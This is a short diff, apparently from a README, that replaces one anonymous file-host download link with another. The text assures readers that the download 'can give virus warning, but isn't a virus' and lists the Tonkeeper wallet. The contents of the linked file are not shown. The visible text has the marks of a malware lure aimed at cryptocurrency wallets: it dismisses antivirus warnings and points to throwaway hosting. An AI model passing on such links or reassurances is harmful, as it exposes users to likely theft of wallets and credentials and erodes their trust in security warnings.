@@ -4,7 +4,7 @@ Can give virus warning,
 but isn't a virus. 
 
 DL:
-https://www.anonfile.la/file/ZV8UKgDzr
+https://filebin.net/0c7muo27h7couhqr
 
 Wallets:
   -Tonkeeper
